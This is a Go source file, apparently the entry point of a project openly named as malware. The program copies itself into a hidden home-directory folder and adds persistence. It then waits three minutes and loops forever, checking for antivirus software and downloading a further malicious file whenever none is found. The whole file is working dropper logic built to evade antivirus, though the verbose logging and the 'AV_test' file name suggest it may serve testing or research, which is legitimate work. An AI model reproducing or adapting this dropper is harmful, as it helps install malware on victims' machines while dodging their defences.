package main

import (
	"io"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"time"
	"wbio/malware/avdetection"
	"wbio/malware/downloading"
	e "wbio/malware/errorinfo"
	"wbio/malware/evasion"
	"wbio/malware/persistence"
)

/* config */
var maliciousFileName = "AV_test"
var logFileName = "malware.log"
var windowsDir = "wbio"
var linuxDir = ".tmp"

/* end of config */

var targetDirectory = ""

func init() {
	userHomeDir, err := os.UserHomeDir()
	e.Check(err, true)

	if runtime.GOOS == "windows" {
		targetDirectory = filepath.FromSlash(userHomeDir + "/" + windowsDir)
	} else {
		targetDirectory = filepath.FromSlash(userHomeDir + "/" + linuxDir)
	}
}

func main() {

	dropper, err := os.Executable()
	e.Check(err, true)

	f, err := os.OpenFile(filepath.FromSlash(filepath.Dir(dropper)+"/"+logFileName), os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	e.Check(err, true)
	defer f.Close()
	mw := io.MultiWriter(os.Stdout, f)
	log.SetOutput(mw)
	log.Println("[START] Program started")

	log.Printf("[MAIN] Target directory: %s\n", targetDirectory)
	evasion.MoveToTargetDirectory(targetDirectory)

	persistence.AddPersistence(targetDirectory)

	log.Println("[MAIN] Sleeping for 3 minutes")
	time.Sleep(3 * time.Minute)

	for {
		if !avdetection.IsAntivirusPresent() {
			log.Println("[AV] Antivirus present: FALSE")
			downloading.DownloadMalware(targetDirectory, maliciousFileName)
		} else {
			log.Println("[AV] Antivirus present: TRUE")
		}
		time.Sleep(60 * time.Second)
	}
}
